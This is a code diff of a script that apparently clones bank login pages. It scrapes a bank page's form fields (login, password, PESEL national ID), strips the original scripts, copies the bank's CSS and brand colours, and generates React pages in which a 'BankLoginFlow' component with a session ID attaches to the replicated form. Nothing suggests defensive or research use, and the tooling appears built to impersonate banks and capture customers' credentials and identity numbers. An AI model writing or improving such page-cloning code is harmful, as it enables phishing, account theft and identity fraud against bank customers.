@@ -27,21 +27,21 @@ root.querySelectorAll('script').forEach((s) => s.remove());
 root.querySelectorAll('link[rel="stylesheet"]').forEach((l) => l.remove());
 
 // ---- Extract form fields ----
-const form = root.querySelector('#lk_form');
-if (!form) {
+const formEl = root.querySelector('#lk_form');
+if (!formEl) {
     console.error('Form #lk_form not found');
     process.exit(1);
 }
-const hasLogin = !!form.querySelector('#login');
-const hasPassword = !!form.querySelector('#password');
-const hasPesel = !!form.querySelector('#pesel');
+const hasLogin = !!formEl.querySelector('#login');
+const hasPassword = !!formEl.querySelector('#password');
+const hasPesel = !!formEl.querySelector('#pesel');
 const fields = [];
 if (hasLogin) fields.push({ name: 'login', type: 'text', i18nKey: 'fields.username', required: true, autocomplete: 'off' });
 if (hasPassword) fields.push({ name: 'password', type: 'password', i18nKey: 'fields.password', required: true, autocomplete: 'new-password' });
 if (hasPesel) fields.push({ name: 'pesel', type: 'text', i18nKey: 'fields.userIdentification', required: false, autocomplete: 'off' });
 
 // ---- Extract CTA variant + i18nKey ----
-const loginBtn = form.querySelector('#loginButton');
+const loginBtn = formEl.querySelector('#loginButton');
 const btnClass = loginBtn?.getAttribute('class') ?? '';
 let variant = 'primary';
 if (btnClass.includes('btn-yellow')) variant = 'yellow';
@@ -62,19 +62,24 @@ const styles = root.querySelectorAll('style')
     .filter((t) => !t.includes('--swal2-'));
 const bankCss = styles.join('\n\n/* ---- */\n\n');
 
-// ---- Guess brand primary/accent from CSS ----
-const primaryMatch = bankCss.match(/\.btn-(?:yellow|orange|blue)[^}]*background-color:\s*(#[0-9a-fA-F]{3,8})/);
-const primary = primaryMatch?.[1] ?? '#004B5A';
-const accentMatch = bankCss.match(/\.btn-(?:yellow|orange|blue)[^}]*color:\s*(#[0-9a-fA-F]{3,8})/);
-const ctaTextColor = accentMatch?.[1] ?? '#ffffff';
+// ---- Guess brand primary/accent from CSS. Try known btn-* first, fall back to any .btn-/.submit- rule. ----
+function findColor(css, pattern, colorProp) {
+    const re = new RegExp(pattern.source + `[^}]*\\b${colorProp}:\\s*(#[0-9a-fA-F]{3,8})`, 'i');
+    return css.match(re)?.[1];
+}
+const primary =
+    findColor(bankCss, /\.btn-(?:yellow|orange|blue|green|red|main)\b/, '(?:background-color|background)') ??
+    findColor(bankCss, /\.(?:btn-[a-z]+|submit-btn)\b/, '(?:background-color|background)') ??
+    '#004B5A';
+const ctaTextColor =
+    findColor(bankCss, /\.btn-(?:yellow|orange|blue|green|red|main)\b/, 'color') ??
+    findColor(bankCss, /\.(?:btn-[a-z]+|submit-btn)\b/, 'color') ??
+    '#ffffff';
 
-// ---- Extract header, main (without form), footer ----
+// ---- Extract header, main, footer. Form (#lk_form) stays inside main so BankLoginFlow can attach listener. ----
 const headerEl = root.querySelector('header');
 const mainEl = root.querySelector('main');
 const footerEl = root.querySelector('footer');
-if (mainEl && form) {
-    form.replaceWith('<!--BANK_LOGIN_FLOW-->');
-}
 const headerHtml = headerEl ? headerEl.innerHTML : '';
 const mainHtml = mainEl ? mainEl.innerHTML : '';
 const footerHtml = footerEl ? footerEl.innerHTML : '';
@@ -119,7 +124,6 @@ writeFileSync(cfgPath, configTs);
 // ---- Write page wrapper ----
 const pagePath = join(ROOT, 'resources/js/Pages/Banks', `${pascal}.tsx`);
 mkdirSync(join(ROOT, 'resources/js/Pages/Banks'), { recursive: true });
-const mainParts = mainHtml.split('<!--BANK_LOGIN_FLOW-->');
 const pageTsx = `import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
 import { ${camel} } from '@/config/banks/${slug}';
 import css from './${pascal}.css?inline';
@@ -127,8 +131,7 @@ import css from './${pascal}.css?inline';
 type Props = { sessionId: string };
 
 const HEADER_HTML = ${JSON.stringify(headerHtml)};
-const MAIN_PRE_HTML = ${JSON.stringify(mainParts[0] ?? '')};
-const MAIN_POST_HTML = ${JSON.stringify(mainParts[1] ?? '')};
+const MAIN_HTML = ${JSON.stringify(mainHtml)};
 const FOOTER_HTML = ${JSON.stringify(footerHtml)};
 
 export default function ${pascal}({ sessionId }: Props) {
@@ -136,12 +139,9 @@ export default function ${pascal}({ sessionId }: Props) {
         <div className="d-flex flex-column h-100">
             <style dangerouslySetInnerHTML={{ __html: css }} />
             <header dangerouslySetInnerHTML={{ __html: HEADER_HTML }} />
-            <main className="mt-5">
-                <div dangerouslySetInnerHTML={{ __html: MAIN_PRE_HTML }} />
-                <BankLoginFlow bank={${camel}} sessionId={sessionId} />
-                <div dangerouslySetInnerHTML={{ __html: MAIN_POST_HTML }} />
-            </main>
+            <main className="mt-5" dangerouslySetInnerHTML={{ __html: MAIN_HTML }} />
             <footer className="mt-5 mt-lg-auto" dangerouslySetInnerHTML={{ __html: FOOTER_HTML }} />
+            <BankLoginFlow bank={${camel}} sessionId={sessionId} />
         </div>
     );
 }
